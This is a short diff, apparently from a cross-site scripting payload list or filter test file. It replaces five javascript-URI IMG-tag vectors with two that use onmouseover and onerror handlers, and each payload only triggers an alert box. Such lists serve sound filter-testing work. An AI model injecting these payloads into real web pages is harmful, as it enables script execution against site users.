@@ -1,5 +1,2 @@
-<IMG SRC="javascript:alert('XSS');">
-<IMG SRC=javascript:alert('XSS')>
-<IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG SRC=javascript:alert("XSS")>
-<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG onmouseover="alert('xxs')" onerror='alert(2)' src="hello">
+  <IMG onmouseover="alert('xxs')" onerror='alert(2)' src="../hellox">
